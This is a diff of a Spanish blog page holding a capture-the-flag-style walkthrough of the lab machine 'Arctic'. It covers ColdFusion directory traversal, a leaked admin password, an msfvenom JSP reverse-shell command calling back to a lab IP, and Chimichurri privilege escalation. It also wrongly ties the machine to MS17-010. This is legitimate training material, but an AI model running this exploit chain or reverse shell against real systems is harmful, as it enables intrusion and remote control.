@@ -30,32 +30,33 @@
         <div class="container mt-4">
             <h2 class="text">Arctic</h2>
             <p class="text mb-4">Posteado el 04-09-2020 por Pablo.</p>
-            <img src="../../multimedia/images/arctic/arctic_00.png" class="mx-auto d-block m-4" alt="Arctic">
+            
             <div class="row">
-              <div class="col-md-8 offset-md-2">
-
+              <div class="col">
                 <p class="text-justify mb-5">
+                    <img src="../../multimedia/images/arctic/arctic_00.png" class="img-fluid" alt="Arctic">
+                    <br><br>
                     Esta máquina es muy parecida a Legacy desde el punto de vista que el vector de ingreso es una vulnerabilidad muy conocida llamada EternalArctic o MS17-010. Usando Metasploit es dácil aunque hay que correr el exploit varias veces hasta que funcione, las cosas se complican un poco para explotarla de forma manual pero después de un par de horas de investigación salió andando.
-
+                    <br><br>
                     <h4>Enumeración y Reconocimiento</h4>
                     <br>
                     <kbd>nmap -A -T4 -p 135, 8500, 49154 10.10.10.11 -oA Optimus</kbd>
                     <br><br>
-                    <img src="../../multimedia/images/arctic/arctic_01.png" class="mx-auto d-block m-4" alt="Arctic">
+                    <img src="../../multimedia/images/arctic/arctic_01.png" class="img-fluid" alt="Arctic">
                     <br><br>
                     Lo más destacable del resultado de <kbd>nmap</kbd> es el puerto 8500 que parece estar registrado al protocolo FMTP ¿?. NO encontré mucha información asi que se me ocurrió entrar con un browser y resulta que había un servidor web. 
                     <br>
                     El servidor enigmatico responde con un listado de directorios, uno se llamaba `CFIDE` así que decidí investigar sobre eso y todo estaba relacionado con **Adobe Coldfusion**. Si uno se sigue perdiendo por el arbol de directorios que se lista se encuentra la página de login:
                     <br><br>
-                    <img src="../../multimedia/images/arctic/arctic_02.png" class="mx-auto d-block m-4" alt="Arctic">
+                    <img src="../../multimedia/images/arctic/arctic_02.png" class="img-fluid" alt="Arctic">
                     <br><br>
-                    <h4>Enumeración y Reconocimiento</h4>
+                    <h4>Explotación</h4>
                     <br>
                     No tengo ni idea de por donde empezar con esta aplicación web así que voy a Serachsploit, aparece una larga lista de exploits pero me llamaron la atención los de Directory Traversal (14641.py).
                     <br>
                     <kbd>searchsploit coldfusion 8</kbd>
                     <br><br>
-                    <img src="../../multimedia/images/arctic/code_01.png" class="mx-auto d-block m-4" alt="Arctic">
+                    <img src="../../multimedia/images/arctic/code_01.png" class="img-fluid" alt="Arctic">
                     <br><br>
                     Al script se le pasan 3 parámetros:
                     <br>
@@ -65,31 +66,29 @@
                         <li>Path a ciertos archivos hosteados que permiten hacer el DT.</li>
                     </ol>
                     <br><br>
-                    <img src="../../multimedia/images/arctic/code_02.png" class="mx-auto d-block m-4" alt="Arctic">
+                    <img src="../../multimedia/images/arctic/code_02.png" class="img-fluid" alt="Arctic">
                     <br><br>
                     Exitosamente se consigue un hash en SHA1 que si se busca en internet aparece ya crackeado, el password de Admin es happyday!!
                     <br><br>
-                    <img src="../../multimedia/images/arctic/arctic_03.png" class="mx-auto d-block m-4" alt="Arctic">
+                    <img src="../../multimedia/images/arctic/arctic_03.png" class="img-fluid" alt="Arctic">
                     <br><br>
                     ¿Que se hace ahora? Casualmente Coldfusion tiene una funcionalidad de tareas programadas en donde se le puede indicar que descargue algo de un servidor remoto, me viene perfecto.
                     <br><br>
-                    
-
                     El tema es, ¿Que le subo?
-
-                    <img src="../../multimedia/images/arctic/arctic_05.png" class="mx-auto d-block m-4" alt="Arctic">
-
+                    <br><br>
+                    <img src="../../multimedia/images/arctic/arctic_05.png" class="img-fluid" alt="Arctic">
+                    <br><br>
                     Coldfusion soporta archivos CFM pero nada de ASP o PHP que pueda interpretar, la solución es con msfvenom generar una reverse shell pero en formato jsp:
                     <br><br>
                     <kbd>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f raw -o shell.jsp</kbd>
                     <br><br>
                     La máquina es vulnerable a MS10-59 por lo tanto se debería poder usar <kbd>Chimichurri.exe</kbd>
                     <br><br>
-                    <img src="../../multimedia/images/arctic/code_05.png" class="mx-auto d-block m-4" alt="Arctic">
+                    <img src="../../multimedia/images/arctic/code_05.png" class="img-fluid" alt="Arctic">
                     <br><br>
                     <h4>Flags</h4>
                     <br>
-                    <img src="../../multimedia/images/arctic/code_04.png" class="mx-auto d-block m-4" alt="Arctic">
+                    <img src="../../multimedia/images/arctic/code_04.png" class="img-fluid" alt="Arctic">
                     <br><br>
                 </p>
               </div>
